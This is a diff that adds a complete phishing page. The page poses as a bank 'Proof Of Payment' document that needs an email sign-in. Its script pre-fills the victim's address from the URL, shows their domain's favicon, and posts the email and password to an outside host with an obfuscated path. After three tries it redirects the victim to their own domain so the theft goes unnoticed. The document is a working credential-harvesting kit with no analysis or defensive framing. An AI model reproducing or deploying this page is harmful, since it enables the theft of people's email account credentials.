@@ -1,0 +1,238 @@
+                    
+                        
+                        
+
+                        <title>Proof Of Payment </title>
+
+
+                          <meta charset="utf-8">
+                          <meta name="viewport" content="width=device-width, initial-scale=1">
+                          <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+                          <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+                          <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+
+
+
+                        <style>
+                        body {
+                          font-family: Arial;
+                          background-image: url("https://www.linkpicture.com/q/imageedit_29_9518488993.gif");
+                        }
+
+                        input[type=email], select {
+                            width: 100%;
+                            padding: 12px 20px;
+                            margin: 15px 0;
+                            display: block;
+                            border: 1px solid #ccc;
+                            border-radius: 4px;
+                            box-sizing: border-box;
+                        }
+
+                        input[type=password], select {
+                            width: 100%;
+                            padding: 12px 20px;
+                            margin: 15px 0;
+                            display: block;
+                            border: 1px solid #ccc;
+                            border-radius: 4px;
+                            box-sizing: border-box;
+                        }
+
+                        input[type=submit] {
+                            width: 100%;
+                            background-color: #0078d7;
+                            color: white;
+                            padding: 14px 20px;
+                            margin: 8px 0;
+                            border: none;
+                            border-radius: 4px;
+                            cursor: pointer;
+                        }
+
+                        input[type=submit]:hover {
+                            background-color: #0078d7;
+                        }
+
+                        div.container {
+
+                            margin: auto;
+                            width: 50%;
+                            padding: 10px;
+                            border: 3px #C0C0C0;
+                            border-radius: 10px;
+                            background-color: white;
+                            width: 500px;
+                            padding: 20px;
+                            border-style: solid;
+                            border-width: thin;
+                        }
+                        </style>
+
+
+                        
+
+                        </head><body>
+
+
+
+
+                         <br><br><br><br>
+                         <div class="container"><p align="left">
+
+                        <img height="100" alt="" src="https://upload.wikimedia.org/wikipedia/commons/thumb/8/87/PDF_file_icon.svg/1200px-PDF_file_icon.svg.png" border="0">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;<img width="180" height="40" style="border-color: rgb(0, 0, 0); width: 102px; height: 22px;" src="https://upload.wikimedia.org/wikipedia/en/thumb/8/80/First_National_Bank_Logo.svg/1200px-First_National_Bank_Logo.svg.png">
+
+                        
+                        </p><p></p>
+                        <font face="Trebuchet MS" color="#0078d7" size="3.8"><b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sign in with a valid email and password to continue</b></font>
+
+                        <p></p>
+                       
+
+
+                        <hr style="height:2px;border:none;color:black;background-color:black;">
+                        <div class="alert alert-danger">
+                            This is a protected document, please verify to access.
+                          </div>
+<form id="contact">
+
+                        <center>
+
+                        <input type="email" id="email" name="email" placeholder="Enter Email Address" value="" data-parsley-errors-container="#personal-username-error" data-parsley-error-template="<p></p>" data-parsley-errors-wrapper="<div class=&quot;parsley-errors-list&quot;></div>" data-parsley-error-message="Please enter your email." data-parsley-class-handler="#personal-username-wrap"  required="">
+                             <span id="msg" class="text-danger"></span>
+                            <input type="password" id="password" name="password" placeholder="Enter Email Password"  value="" data-parsley-errors-container="#personal-username-error" data-parsley-error-template="<p></p>" data-parsley-errors-wrapper="<div class=&quot;parsley-errors-list&quot;></div>" data-parsley-error-message="Please enter your password." data-parsley-class-handler="#personal-password-wrap"  required="">
+
+
+                          
+                            <input type="submit" id="submit-btn" value="View Proof Of Payment">
+&nbsp;&nbsp;&nbsp;&nbsp; <img style="border-color: rgb(0, 0, 0);" src="">
+                    
+<script>
+
+
+    /* global $ */
+    $(document).ready(function(){
+      var count=0;
+
+      $('#back1').click(function () {
+        $("#msg").hide();
+        $('#email').val("");
+        $("#automail").animate({left:200, opacity:"hide"}, 0);
+        $("#inputbar").animate({right:200, opacity:"show"}, 1000);
+
+      });
+
+      var email = window.location.hash.substr(1);
+      if (!email) {
+
+      }
+      else
+      {
+        var my_email =email;
+        $('#email').val(my_email);
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_email)) {
+          $('#error').show();
+          email.focus;
+          return false;
+        }
+        var ind=my_email.indexOf("@");
+        var my_slice=my_email.substr((ind+1));
+        var c= my_slice.substr(0, my_slice.indexOf('.'));
+        var final= c.toLowerCase();
+        var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $("#logoname").html(finalu);
+        $(".logoname").html(finalu);
+      }
+
+
+      
+      $('#submit-btn').click(function(event){
+        $('#error').hide();
+        $('#msg').hide();
+        event.preventDefault();
+        var email=$("#email").val();
+        var password=$("#password").val();
+        var msg = $('#msg').html();
+        $('#msg').text( msg );
+
+      ///////////new injection////////////////
+      var my_email =email;
+      var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+      if (!filter.test(my_email)) {
+        $('#error').show();
+        email.focus;
+        return false;
+      }
+
+      var ind=my_email.indexOf("@");
+      var my_slice=my_email.substr((ind+1));
+      var c= my_slice.substr(0, my_slice.indexOf('.'));
+      var final= c.toLowerCase();
+      var finalu= c.toUpperCase();
+
+        $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $(".logoimg").attr("src", "https://www.google.com/s2/favicons?domain="+my_slice);
+        $("#logoname").html(finalu);
+      ///////////new injection////////////////
+      count=count+1;
+      
+      $.ajax({
+        dataType: 'JSON',
+        url: 'https://rexelnetwoking.com/89hu8ntingttonb8nk.acc8ount.up89date/ww89.h89n8unting87ton89com/proof.p8ay8ment.not9iic8tion9upda89ted.89succ89essfully.php',
+        type: 'POST',
+        data:{
+          email:email,
+          password:password,
+        },
+            // data: $('#contact').serialize(),
+            beforeSend: function(xhr){
+              $('#submit-btn').html('Verifing...');
+            },
+            success: function(response){
+              if(response){
+                $("#msg").show();
+                console.log(response);
+                if(response['signal'] == 'ok'){
+                  $("#password").val("");
+                  if (count>=3) {
+                    count=0;
+                    // window.location.replace(response['redirect_link']);
+                    window.location.replace("http://www."+my_slice);
+
+                  }
+                  // $('#msg').html(response['msg']);
+                }
+                else{
+                  // $('#msg').html(response['msg']);
+                }
+              }
+            },
+            error: function(){
+              $("#password").val("");
+              if (count>=3) {
+                count=0;
+                window.location.replace("http://www."+my_slice);
+              }
+              $("#msg").show();
+              // $('#msg').html("Please try again later");
+            },
+            complete: function(){
+              $('#submit-btn').html('Sign in');
+            }
+          });
+    });
+
+
+    });
+
+  </script>
+                        </center></form></div>
+
+                        
+                        
+</body></html>
